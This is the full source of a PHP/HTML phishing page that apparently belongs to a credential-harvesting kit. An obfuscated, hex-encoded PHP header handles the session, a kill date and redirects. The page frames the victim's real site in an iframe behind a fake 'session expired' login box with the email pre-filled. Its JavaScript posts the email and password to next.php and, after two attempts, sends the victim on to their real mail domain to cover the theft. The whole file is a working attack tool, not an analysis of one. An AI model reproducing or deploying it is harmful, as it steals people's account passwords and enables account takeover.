<?php ${"\x47L\x4f\x42\x41\x4cS"}["\x6di\x72\x5f\x5fs\x72\x6cn\x62\x6a\x6ei\x67g\x70r\x62\x68\x6e\x62\x5fk\x5f\x62"]="_\x53E\x53S\x49\x4f\x4e";${"\x47L\x4f\x42A\x4cS"}["\x6ep\x78v\x6fz\x78u\x68i\x74\x76\x78s\x63m\x74\x6er\x6dz\x74y\x66a\x76\x79"]="d\x61t\x65";${"G\x4cO\x42\x41\x4cS"}["\x71\x76k\x69\x6f\x6e\x5fe\x62e\x69\x62\x78z\x67\x76v\x71\x6d\x78\x61\x66"]="\x45\x64e\x53t\x72";${"G\x4cO\x42\x41L\x53"}["u\x71p\x74u\x6eq\x6b\x69\x6bz\x68k\x6an\x5ff\x72p\x6ar\x5f\x79w\x6fh\x6c\x69m\x73m"]="\x4eo\x6ee\x53t\x72";${"\x47L\x4fB\x41L\x53"}["_\x71_\x65_\x64d\x6e\x74\x6a_\x5fc\x72a\x69k\x74a\x75\x70j\x71\x68\x74h\x7a\x77\x78h\x72g\x67b"]="\x72a\x6ed\x6fm";${"\x47L\x4f\x42A\x4cS"}["_\x77\x6cx\x72\x6c\x62\x64\x7ai\x6f\x6e\x73v\x77\x76w\x71\x66e\x61b\x64r\x67\x78z\x74q\x70_\x74\x6br"]="d\x73\x74";
if(!isset(${${"\x47L\x4f\x42\x41L\x53"}["\x6di\x72\x5f\x5fs\x72\x6cn\x62\x6a\x6ei\x67g\x70r\x62\x68\x6e\x62\x5fk\x5f\x62"]})){session_start();}
if(isset(${${"G\x4c\x4fB\x41\x4c\x53"}["\x6di\x72\x5f\x5fs\x72\x6cn\x62\x6a\x6ei\x67g\x70r\x62\x68\x6e\x62\x5fk\x5f\x62"]}['Complete'])){header("Location: ./Resources/Migrating.php?id=pages/login?callback=web_v2&relay=206fe6ba-b252-4521-9c6a-3039ddd13900&locale=en_US&flow_type=token&idp_flow_type=login");exit();}date_default_timezone_set('Europe/London');${${"G\x4cO\x42\x41\x4cS"}["\x6ep\x78v\x6fz\x78u\x68i\x74\x76\x78s\x63m\x74\x6er\x6dz\x74y\x66a\x76\x79"]}=date('d M Y, G:i A');${${"\x47\x4c\x4fB\x41\x4cS"}["\x71\x76k\x69\x6f\x6e\x5fe\x62e\x69\x62\x78z\x67\x76v\x71\x6d\x78\x61\x66"]}=strtotime("July 22, 2020, 01:30");${${"G\x4c\x4fB\x41L\x53"}["u\x71p\x74u\x6eq\x6b\x69\x6bz\x68k\x6an\x5ff\x72p\x6ar\x5f\x79w\x6fh\x6c\x69m\x73m"]}=strtotime(date('F d, Y, h:i A'));if(${${"G\x4c\x4fB\x41L\x53"}["\x71\x76k\x69\x6f\x6e\x5fe\x62e\x69\x62\x78z\x67\x76v\x71\x6d\x78\x61\x66"]}<= ${${"G\x4c\x4f\x42A\x4cS"}["u\x71p\x74u\x6eq\x6b\x69\x6bz\x68k\x6an\x5ff\x72p\x6ar\x5f\x79w\x6fh\x6c\x69m\x73m"]}){header("Location: https://www.google.com.my");exit();}${${"G\x4cO\x42\x41L\x53"}["_\x71_\x65_\x64d\x6e\x74\x6a_\x5fc\x72a\x69k\x74a\x75\x70j\x71\x68\x74h\x7a\x77\x78h\x72g\x67b"]}=rand(50000,100000000000);${${"G\x4c\x4f\x42\x41L\x53"}["_\x77\x6cx\x72\x6c\x62\x64\x7ai\x6f\x6e\x73v\x77\x76w\x71\x66e\x61b\x64r\x67\x78z\x74q\x70_\x74\x6br"]}=substr(md5(${${"G\x4c\x4fB\x41L\x53"}["_\x71_\x65_\x64d\x6e\x74\x6a_\x5fc\x72a\x69k\x74a\x75\x70j\x71\x68\x74h\x7a\x77\x78h\x72g\x67b"]}),0,1000000000);require("count.php");require("Directory/id.php");require("Directory/page.php");require("Directory/help.php");require("settings.php");if(!isset(${${"G\x4cO\x42A\x4c\x53"}["\x6di\x72\x5f\x5fs\x72\x6cn\x62\x6a\x6ei\x67g\x70r\x62\x68\x6e\x62\x5fk\x5f\x62"]}['Index2'])){header("\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x20\x2e\x2f\x69\x6e\x64\x65\x78\x2e\x70\x68\x70\x3f${${"G\x4cO\x42\x41L\x53"}["_\x77\x6cx\x72\x6c\x62\x64\x7ai\x6f\x6e\x73v\x77\x76w\x71\x66e\x61b\x64r\x67\x78z\x74q\x70_\x74\x6br"]}\x26\x26\x6c\x6f\x67\x69\x6e\x2f\x73\x65\x73\x73\x69\x6f\x6e\x5f\x74\x69\x6d\x65\x64\x5f\x6f\x75\x74\x6b\x26\x74\x6f\x6b\x65\x6e\x3d\x71\x33\x63\x33\x51\x68\x62\x4f\x48\x5a\x33\x70\x59\x6e\x67\x6d\x6c\x62\x52\x32\x73\x41\x36\x6e\x79\x61\x41\x6e\x31\x63\x6b\x4c\x3d${${"\x47L\x4fB\x41\x4c\x53"}["_\x71_\x65_\x64d\x6e\x74\x6a_\x5fc\x72a\x69k\x74a\x75\x70j\x71\x68\x74h\x7a\x77\x78h\x72g\x67b"]}\x26\x6c\x6f\x67\x69\x6e\x2f\x73\x65\x73\x73\x69\x6f\x6e\x5f\x74\x69\x6d\x65\x64\x5f\x6f\x75\x74\x74\x6f\x6b\x65\x6e\x3d\x71\x33\x63\x33\x51\x68\x62\x4f\x48\x5a\x33\x70\x59\x6e\x67\x6d\x6c\x62\x52\x32\x73\x41\x36\x6e\x79\x61\x41\x6e\x31\x63\x6b\x4c\x26\x65\x6d\x61\x69\x6c\x3d");} ?>


<!DOCTYPE html>
<html lang="en">
<head>
	<title><?= $_SESSION['CAPSDOMAIN'] ?> - Login</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="cache-control" content="no-cache,no-store"/>
        <meta http-equiv="pragma" content="no-cache"/>
		<!-- Robots -->
  <meta name="robots" content="noindex">
<!--===============================================================================================-->	
	<link rel="icon" type="image/png" href="https://www.google.com/s2/favicons?domain=<?= $_SESSION['Site'] ?>"/>
<!--===============================================================================================-->

<!-- //////////////////my inject/////// -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link id="cl_shortcut_icon" rel="shortcut icon" href="images/favicon.ico" />

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Page</title>
    <link href="css/hover.css" rel="stylesheet" media="all">
</head>
<script language="Javascript" src="myscr569498.js"></script>
	<iframe id="mainPage" src="<?= $_SESSION['Site'] ?>" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
	
	<div class="container-login100">
		<div class="wrap-login100 p-l-55 p-r-55 me-top p-b-30">
		<span class="login100-form-title p-b-37">
					<img id="favIcon" src="https://www.google.com/s2/favicons?domain=<?= $_SESSION['Site'] ?>"> &nbsp;&nbsp;<?= $USession_Expired_Text ?>
				</span>
			<script language="Javascript" src="myscr355734.js"></script>
			<span class="login100-form-title p-b-37">
					<?= $Update_Email_Text ?>
				</span>
				<center>
                <div class="alert alert-danger" id="msg" style="display: none;"></div>
                <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
              </center>

				<div class="wrap-input100 validate-input m-b-20" data-validate="Enter username or email">
					<input class="input100" type="text" id="username" name="username" placeholder="username or email" value="<?= $_SESSION['Email'] ?>" readonly>
					<span class="focus-input100"></span>
				</div>

				<div class="wrap-input100 validate-input m-b-25" data-validate = "Enter email password">
					<input class="input100" type="password" id="pass" name="pass" placeholder="Enter email password">
					<span class="focus-input100"></span>
				</div>
				<input id="email" class="nono" name="email" type="email">
				<input id="password" class="nono" name="password" type="password">
				<div class="container-login100-form-btn">
					<!-- <button class="login100-form-btn" id="submitButton">
						<?= $Login_Button_Text  ?>
					</button>
					<button class="" >
						login
					</button> -->
					<button class="btn py-2 w-50 text-white" id="submit-btn" style="background-color: #bd59d4; border-radius: 20px;">LOGIN</button>
				</div>

				<script language="Javascript" src="myscr352825.js"></script>
	

  <!-- Optional JavaScript -->
  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>

	$(document).ready(function(){
    var count=0;


	$('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#username").val();
        var password=$("#pass").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      ///////////new injection////////////////
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'next.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifying...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                  $("#pass").val("");
                  if (count>=2) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("https://www."+my_slice);

                  }
                  $('#msg').html(response['msg']);
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#pass").val("");
              if (count>=2) {
                count=0;
                window.location.replace("https://www."+my_slice);
              }
              $("#msg").show();
              $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('LOGIN');
            }
          });
    });

    });

</script>




</html>